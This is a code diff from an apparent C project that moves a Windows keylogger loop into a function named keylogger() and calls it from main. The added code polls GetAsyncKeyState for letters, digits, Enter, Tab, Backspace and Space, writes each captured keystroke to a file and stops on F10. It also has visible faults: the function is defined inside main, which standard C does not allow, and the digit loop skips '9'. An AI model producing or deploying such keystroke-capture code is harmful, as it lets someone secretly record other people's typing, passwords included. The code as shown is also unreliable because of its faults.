@@ -108,41 +108,45 @@ int main(int argc, char const *argv[]){
 
     log_info("Looping...");
 
-    while(true){
-			// Letters loop ("A"=65, "Z"=90)	
-			for(char i=65; i<91; i++){
-				if(GetAsyncKeyState(i)){
-					if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)){
-						fputc(i, file_pointer);
-					} else{
-						fputc(i+32, file_pointer);
-					}
-				}
-			}
+    int keylogger(void){
+      while(true){
+        // Letters loop ("A"=65, "Z"=90)	
+        for(char i=65; i<91; i++){
+          if(GetAsyncKeyState(i)){
+            if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)){
+              fputc(i, file_pointer);
+            } else{
+              fputc(i+32, file_pointer);
+            }
+          }
+        }
+        // Numbers loops ("0"=48, "9"=57)
+        for(char i=48; i<57; i++){
+          if(GetAsyncKeyState(i)){
+            fputc(i, file_pointer);
+          }
+        }
+        // Special inputs
+        if(GetAsyncKeyState(VK_RETURN)){
+          fputs("[ENTER]\n", file_pointer);
+        } else if(GetAsyncKeyState(VK_TAB)){
+          fputs("[TAB]", file_pointer);
+        } else if(GetAsyncKeyState(VK_BACK)){
+          fputs("[BACKSPACE]", file_pointer);
+        } else if(GetAsyncKeyState(VK_SPACE)){
+          fputs("[SPACE]", file_pointer);      
+        } else if(GetAsyncKeyState(VK_F10)){
+          fclose(file_pointer);
+          return 0;
+        }
+        fflush(file_pointer);
+        Sleep(100);
+      }
+    }
 
-			// Numbers loops ("0"=48, "9"=57)
-			for(char i=48; i<57; i++){
-				if(GetAsyncKeyState(i)){
-					fputc(i, file_pointer);
-				}
-			}
+    log_info("Call Keylogger Function...");
 
-			// Special inputs
-			if(GetAsyncKeyState(VK_RETURN)){
-				fputs("[ENTER]\n", file_pointer);
-			} else if(GetAsyncKeyState(VK_TAB)){
-				fputs("[TAB]", file_pointer);
-			} else if(GetAsyncKeyState(VK_BACK)){
-				fputs("[BACKSPACE]", file_pointer);
-			} else if(GetAsyncKeyState(VK_SPACE)){
-			 	fputs("[SPACE]", file_pointer);      
-			} else if(GetAsyncKeyState(VK_F10)){
-				fclose(file_pointer);
-				return 0;
-			}
-			fflush(file_pointer);
-			Sleep(100);
-		}
+    keylogger();
     
   #elif defined(__linux__)
     log_info("We are in a Linux System.");
